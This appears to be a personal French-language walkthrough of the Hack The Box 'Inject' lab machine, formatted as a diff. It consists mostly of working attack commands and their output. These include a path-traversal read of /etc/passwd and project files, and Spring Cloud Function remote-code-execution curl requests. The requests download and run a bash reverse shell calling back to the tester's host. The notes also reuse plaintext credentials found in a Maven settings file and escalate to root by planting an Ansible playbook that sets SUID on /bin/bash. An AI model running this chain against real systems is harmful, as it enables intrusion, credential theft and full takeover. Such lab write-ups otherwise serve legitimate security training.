@@ -1,0 +1,125 @@
+HTB Inject
+
+nmaper -i 10.10.11.204  -o Inject
+----------| SCAN START |----------
+
+[*] Target => 10.10.11.204
+[*] Output Folder => Inject
+[*] Min Rate => 200
+
+[*] Starting quick TCP scan
+[+] Ports found: 22,8080
+
+
+8080-> Site web
+
+user : 
+	- Brandon Auger
+	- admin
+
+Bouton Update :
+	- LFI : ../../../../../../etc/passwd
+	(dans burpsuite)
+		- user :
+			phil
+			_laurel
+
+On utilise la LFI pour regarder dans le dossier de phil puis dans le /var/www/WebApp
+	- GET /show_image?img=../../../../../../var/www/WebApp/pom.xml
+
+		-> info : <groupId>org.springframework.boot</groupId>
+					<version>2.6.5</version>
+
+		le bordel pour trouver un exploit et comprendre :
+
+		curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"ping -c 4 10.10.16.4")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'
+
+		listener : tcpdump -i tun0 icmp
+
+				Retour :
+				# tcpdump -i tun0 icmp                                                                                          1 ⨯
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+23:01:35.578011 IP 10.10.11.204 > 10.10.16.4: ICMP echo request, id 2, seq 1, length 64
+23:01:35.578095 IP 10.10.16.4 > 10.10.11.204: ICMP echo reply, id 2, seq 1, length 64
+23:01:36.518438 IP 10.10.11.204 > 10.10.16.4: ICMP echo request, id 2, seq 2, length 64
+23:01:36.518499 IP 10.10.16.4 > 10.10.11.204: ICMP echo reply, id 2, seq 2, length 64
+23:01:37.519294 IP 10.10.11.204 > 10.10.16.4: ICMP echo request, id 2, seq 3, length 64
+23:01:37.519321 IP 10.10.16.4 > 10.10.11.204: ICMP echo reply, id 2, seq 3, length 64
+
+
+
+Donc maintenant on fait un reverse :
+
+#!/bin/bash
+bash -i >& /dev/tcp/10.10.16.4/4444 0>&1
+
+dans "revshell.sh"
+
+# curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"curl http://10.10.16.4/revshell.sh -o /tmp/revshell.sh")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'
+
+puis 
+
+# curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"chmod u+x /tmp/revshell.sh")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'
+
+et enfin :
+
+a coté :  nc -lvnp 444
+
+# curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"bash /tmp/revshell.sh")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'
+
+On est USER !!
+	frank@inject:~$ id
+uid=1000(frank) gid=1000(frank) groups=1000(frank)
+
+ls -al
+on trouve : .m2
+puis : settings.xml
+
+avec dedans :
+	frank@inject:~/.m2$ cat settings.xml
+cat settings.xml
+<?xml version="1.0" encoding="UTF-8"?>
+<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
+  <servers>
+    <server>
+      <id>Inject</id>
+      <username>phil</username>
+      <password>DocPhillovestoInject123</password>
+      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
+      <filePermissions>660</filePermissions>
+      <directoryPermissions>660</directoryPermissions>
+      <configuration></configuration>
+    </server>
+  </servers>
+</settings>
+
+Donc on peut faire :
+	- frank@inject:~/.m2$ su phil
+	On est frank on a le user.txt
+
+
+avec un : ps -aux
+	on voit un process qui execute : /opt/automation/tasks/playbook_1.yml
+	on créé un playbook_2.yml
+
+
+- hosts: localhost
+  tasks:
+  - name: up Priv
+    ansible.builtin.shell: |
+      chmod +s /bin/bash
+    become: true
+
+
+on le wget avec un serveur python, dans le meme dossier
+et on fait : bash -f (apres quelques minute)
+
+bash -p
+id
+uid=1001(phil) gid=1001(phil) euid=0(root) egid=0(root) groups=0(root),50(staff),1001(phil)
+whoami
+root
+cat /root/root.txt
+
